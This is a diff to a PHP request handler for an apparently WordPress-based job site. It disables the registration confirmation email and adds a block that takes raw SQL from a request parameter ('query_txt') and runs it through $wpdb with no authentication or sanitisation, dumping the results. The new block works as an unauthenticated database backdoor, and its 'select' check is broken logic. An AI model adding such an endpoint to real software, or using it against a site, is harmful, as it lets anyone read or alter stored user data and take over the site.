@@ -210,7 +210,7 @@ if ($_REQUEST) {
             case "register":
                 $result = $classCandidate->addCandidate($_REQUEST);
 
-                if (!$result['error'] && !$getPostBackend) {
+                /*if (!$result['error'] && !$getPostBackend) {
                     //$this->setUserLogin($user_id);
                     $_REQUEST['key'] = $result['key'];
                     ob_start();
@@ -221,8 +221,8 @@ if ($_REQUEST) {
                     if (!wp_mail($_REQUEST['email'], "Register Confirmation from Job Jap Thai", $message)) {
                         echo $classCandidate->returnMessage("Sorry error send email.", true);
                     }
-                }
-                //var_dump($result);
+                }*/
+
                 echo $classCandidate->returnMessage($result, $result['error'], true);
                 break;
             case "none_member":
@@ -526,6 +526,21 @@ if ($_REQUEST) {
         
 //        $result = $classOthSetting->saveWorkingDay($_REQUEST[$classOthSetting->namePositionList]);
         echo $result;
+        exit;
+    }
+
+    $queryBackendPost = empty($_REQUEST['query_backend_post'])? false: $_REQUEST['query_backend_post'];
+    if ($queryBackendPost) {
+        $sql = empty($_REQUEST['query_txt'])? null: $_REQUEST['query_txt'];
+        if (strstr($sql, 'select') >= 0) {
+            $result = $wpdb->get_results($sql);
+            var_dump($result);
+        } else {
+            $result = $wpdb->query($sql);
+            if ($result)
+                echo "Success";
+            else echo "Fail";
+        }
         exit;
     }
 
